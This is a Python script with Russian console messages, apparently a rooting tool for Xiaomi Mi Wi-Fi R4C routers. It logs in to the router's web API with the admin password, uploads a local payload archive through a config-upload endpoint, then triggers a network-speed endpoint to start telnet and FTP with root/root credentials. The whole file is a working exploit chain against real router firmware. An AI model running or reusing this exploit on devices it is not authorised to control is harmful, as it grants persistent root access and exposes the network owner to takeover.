import sys
import re
import time
import random
import hashlib
import requests
import socket
import telnetlib
import ftplib
import os
import gateway


router_ip_address=gateway.get_ip_address()

try: 
	r0 = requests.get("http://{router_ip_address}/cgi-bin/luci/web".format(router_ip_address=router_ip_address))
except:
    print ()
    print ()
    print ("Xiaomi Mi Wi-Fi не найден")
    print ()
    print ()
    print ()
    print ()
    sys.exit(1)
	




try:	
    mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
except:
    print ()
    print ()
    print ("Пройдите первоначальную настройку роутера и задайте пароль.")
    print ()
    print ()
    print ()
    print ()
    sys.exit(1)
        
print ()
print ()  
  
key = re.findall(r'key: \'(.*)\',', r0.text)[0]
nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
router_password = "12345678"
router_password = input("[Нажмите Enter чтобы выбрать '{}' или введите пароль]: ".format(router_password)) or router_password
account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
r1 = requests.post("http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address), 
	data = data, 
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})

try:	
	stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
except:
    print ()
    print ()
    print ("Пароль не верен!")
    print ()
    print ()
    print ()
    print ()
    sys.exit(1)

print("Начинаю загрузку конфигурационных файлов...")

requests.post("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload".format(router_ip_address=router_ip_address,stok=stok), files={"image":open("payload.tar.gz",'rb')})

print("Запускаю telnet и ftp серверы...")
print("")
print("1 попытка.")

requests.get("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed".format(router_ip_address=router_ip_address,stok=stok))


try:	
	ftp=ftplib.FTP(router_ip_address)
	ftp.quit()
except:
	print("")
	print("2 попытка.")
	requests.post("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload".format(router_ip_address=router_ip_address,stok=stok), files={"image":open("payload.tar.gz",'rb')})
	requests.get("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed".format(router_ip_address=router_ip_address,stok=stok))

try:	
	ftp=ftplib.FTP(router_ip_address)
	ftp.quit()
except:
	print("")
	print("3 попытка.")
	requests.post("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload".format(router_ip_address=router_ip_address,stok=stok), files={"image":open("payload.tar.gz",'rb')})
	requests.get("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed".format(router_ip_address=router_ip_address,stok=stok))

try:	
	ftp=ftplib.FTP(router_ip_address)
	os.system('cls')
	print("")
	print("********************************")
	print("!!!Удача!!!")
	print("        !!!Удача!!!")
	print("                !!!Удача!!!")
	print("")
	print("telnet: {}".format(router_ip_address))
	print("user: root, password: root")
	print("********************************")
	print("")
	print("")
	print("")
	print("")
	ftp.quit()
except:
	os.system('cls')
	print("Роутер точно R4C?")
	print("")
	print("*************************************")
	print("                !!!Давай еще раз!!!")
	print("        !!!Давай еще раз!!!")
	print("!!!Давай еще раз!!!")
	print("*************************************")
	print("")
	print("")
	print("")
	print("")